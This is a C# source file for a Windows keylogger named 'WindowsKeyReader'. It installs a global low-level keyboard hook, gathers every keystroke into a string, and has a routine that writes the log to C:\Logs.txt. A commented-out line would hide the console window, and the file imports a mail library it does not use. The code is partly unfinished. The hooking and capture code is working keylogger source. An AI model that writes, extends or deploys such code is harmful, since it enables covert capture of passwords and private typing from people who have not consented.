using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;//import of dlls
using System.Diagnostics;//used to build hooks
using System.Windows.Forms;//converting of keystrokes into readable keys
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;


namespace WindowsKeyReader
{
    class Program
    {
        //https://docs.microsoft.com/en-us/windows/desktop/winmsg/about-hooks
        private static int WH_KEYBOARD_LL = 13;//The WH_KEYBOARD_LL hook enables you to monitor keyboard input events about to be posted in a thread input queue.
        private static int WM_KEYDOWN = 0x0100;//https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
        private static IntPtr hook = IntPtr.Zero; //A read-only field that represents a pointer or handle that has been initialized to zero.
        private static LowLevelKeyboardProc proc = HookCallback;
        const int SW_HIDE = 0;
        static bool exitProc = false;
        private delegate bool EventHandler(CtrlType had);
        static EventHandler _handler;
        

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            //ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
            hook = SetHook(proc);
            Application.Run();
            UnhookWindowsHookEx(hook);

            _handler += new EventHandler(Handler);
            SetConsoleCtrlHandler(_handler, true);
            //Starts Thread here
            Program p = new Program();
            p.Start();

            //Keeps the console to not run off
            while(!exitProc)
            {
                Thread.Sleep(500);
            }
        }

        public void Start()
        {
            MessageBox.Show("Jipeee");
        }

        enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool Handler(CtrlType had)
        {
            Thread.Sleep(5000);
            MessageBox.Show("Cleanup complete");
            exitProc = true;
            Environment.Exit(-1);

            return true;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        //ricus comment
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static string logs = "";// skryf alles wat mens log
        //string logs = "";
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {


            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                ////////////////////////////////////////////////////////
                try
                {
                    if ((Convert.ToString((Keys)vkCode).ToUpper() == "SPACE"))
                    {
                        logs += " ";
                    }
                    else if (Convert.ToString((Keys)vkCode).ToUpper() == "RETURN")
                    {
                        logs += "\n";

                    }
                    else
                    {
                        logs = logs + ((Keys)vkCode).ToString();
                    }

                    //MessageBox.Show(logs);

                }
                catch { }
                ////////////////////////////////////////////////////////////////
                //Console.WriteLine((Keys)vkCode);
            }
           
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        public void writetolog()
        {
            StreamWriter writer = new StreamWriter("C:\\Logs.txt");
            writer.WriteLine(logs);
            writer.Close();

        }

        [DllImport("kernel32.dll")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]// handles memory management, input/output operations, and interrupts.
        private static extern IntPtr GetModuleHandle(String lpModuleName);


    }
}
